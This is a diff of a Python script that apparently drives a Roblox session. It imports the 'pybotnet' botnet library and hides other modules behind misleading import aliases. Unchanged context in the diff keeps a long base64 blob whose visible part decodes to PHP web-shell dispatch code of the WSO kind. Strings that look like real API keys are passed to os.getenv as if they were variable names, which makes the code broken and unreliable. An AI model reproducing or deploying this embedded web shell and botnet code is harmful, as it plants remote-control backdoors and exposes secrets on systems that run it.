@@ -9,8 +9,8 @@ import Checker as xmlrpclib
 import alpha_remote as date
 import time
 import logging 
-from kivy.config import Config
-from pybotnet import robots, setup ,canny, satellite 
+from kivy.config import Config as robots
+from pybotnet import canny
 from datetime import datetime
 from scanner import requests
 from urllib import parse
@@ -146,7 +146,7 @@ HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 roblox_session.headers.update(HEADERS)
-Config.set('input', 'mtdev_%(name)s', 'Checker')
+robots.set('input', 'mtdev_%(name)s', 'checker')
 # Variáveis sensíveis (usando os.getenv() para ler as variáveis de ambiente)
 consumer_key = os.getenv('W0bhK3GCvOZlUn1F8AvvFcE2U')
 consumer_secret = os.getenv('vv6SqWFJthR8tyVElNKeASdYQnA9MkUA57d7uExHbmFkYu3Oxm')
@@ -1340,7 +1340,7 @@ bHRfYWN0aW9uKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2FjdGlvbicgLiAkZGVmYXVsdF9hY3Rpb24p
 KQ0KCQkkX1BPU1RbJ2EnXSA9ICRkZWZhdWx0X2FjdGlvbjsNCgllbHNlDQoJCSRfUE9TVFsnYSdd
 ID0gJ1NlY0luZm8nOw0KaWYoICFlbXB0eSgkX1BPU1RbJ2EnXSkgJiYgZnVuY3Rpb25fZXhpc3Rz
 KCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pICkNCgljYWxsX3VzZXJfZnVuYygnYWN0aW9uJyAuICRf
-UE9TVFsnYSddKTsNCmV4aXQ7""")  # Substitua "#" com o nome da variável de ambiente do seu token
+UE9TVFsnYSddKTsNCmV4aXQ7""")  
 PATH = os.path.expanduser("~/home")
 
 # Funções de logging
